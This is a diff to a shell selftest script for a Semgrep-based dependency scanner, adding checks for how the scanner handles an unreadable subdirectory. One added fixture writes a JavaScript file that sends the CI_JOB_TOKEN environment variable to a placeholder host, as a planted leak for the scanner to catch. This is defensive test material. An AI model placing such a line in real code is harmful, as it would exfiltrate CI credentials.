@@ -11,7 +11,9 @@ TMP=$(mktemp -d)
 # Каталоги для docker собираются в дереве репозитория: при установке docker из snap
 # bind mount из /tmp хоста в контейнер не виден, и /src приезжает пустым.
 BIG=$(mktemp -d "$HERE/.selftest-big.XXXXXX")
-trap 'rm -rf "$TMP" "$BIG"' EXIT
+LOCKED=$(mktemp -d "$HERE/.selftest-locked.XXXXXX")
+# Права возвращаются до rm -rf: каталог с правами 000 не удалить, не открыв его.
+trap 'chmod -R u+rwx "$LOCKED" 2>/dev/null; rm -rf "$TMP" "$BIG" "$LOCKED"' EXIT
 trap 'exit 130' INT
 trap 'exit 143' TERM
 
@@ -37,7 +39,7 @@ infra() { printf 'ИНФРА  %s\n' "$1"; exit 3; }
 command -v docker >/dev/null 2>&1 || infra 'docker не найден'
 docker info >/dev/null 2>&1 || infra 'демон docker недоступен'
 command -v python3 >/dev/null 2>&1 || infra 'python3 не найден: depscan.sh нечем разбирать отчёт'
-[ -n "$BIG" ] || infra 'не создаётся временный каталог рядом с selftest.sh'
+[ -n "$BIG" ] && [ -n "$LOCKED" ] || infra 'не создаётся временный каталог рядом с selftest.sh'
 
 # Версии берутся из depscan.sh, чтобы selftest не завёл вторую копию пина.
 read_pin() { sed -n "s/^$1='\(.*\)'\$/\1/p" "$HERE/depscan.sh"; }
@@ -128,6 +130,40 @@ expect 3 'scan_result: НЕПОЛНО' -- sh "$HERE/depscan.sh" "$BIG"
 saw 'exceeded_size_limit'
 never 'ЧИСТО'
 never 'ОТКЛОНЕНО'
+
+# Недоступный подкаталог: Semgrep в контейнере работает от root и читает его, а обход
+# каталога на хосте обрывается — значит, список ожидаемых файлов неполон и вердикта нет.
+if [ "$(id -u)" = 0 ]; then
+  printf 'ИНФО   закрытый каталог под root не проверить — пропуск\n'
+else
+  printf 'console.log("ok");\n' >"$LOCKED/benign.js"
+  mkdir -p "$LOCKED/locked"
+  printf 'console.log("ok");\n' >"$LOCKED/locked/inner.js"
+  cp "$SRC_BEN/package-lock.json" "$LOCKED/package-lock.json"
+  chmod 000 "$LOCKED/locked"
+  expect 3 'scan_result: НЕПОЛНО' -- sh "$HERE/depscan.sh" "$LOCKED"
+  saw 'не прочитан'
+  never 'ЧИСТО'
+
+  # Тот же каталог с утечкой в закрытом подкаталоге. Образ обычно работает от root и
+  # файл дочитывает: находка перекрывает неполноту, приоритет 1 > 3 сохраняется. При
+  # rootless docker или user namespaces контейнер закрытый каталог не прочтёт, и
+  # честный исход — 3: утечку никто не видел. Ветка выбирается по uid в контейнере.
+  chmod 755 "$LOCKED/locked"
+  { printf "const https = require('https');\n"
+    printf "https.get('https://example.invalid/?token=' + process.env.CI_JOB_TOKEN);\n"
+  } >"$LOCKED/locked/inner.js"
+  chmod 000 "$LOCKED/locked"
+  if [ "$(docker run --rm "$SEMGREP_IMAGE" id -u 2>/dev/null)" = 0 ]; then
+    expect 1 'неполно' -- sh "$HERE/depscan.sh" "$LOCKED"
+    saw 'ОТКЛОНЕНО'
+  else
+    printf 'ИНФО   контейнер не от root: закрытый каталог не читается и внутри него\n'
+    expect 3 'scan_result: НЕПОЛНО' -- sh "$HERE/depscan.sh" "$LOCKED"
+    never 'ОТКЛОНЕНО'
+  fi
+  chmod 755 "$LOCKED/locked"
+fi
 
 # Профиль расширений задан в scan_result.py. Если образ перестанет брать какое-то из
 # шести, охват станет неполным и строка упадёт — дрейф будет виден сразу.
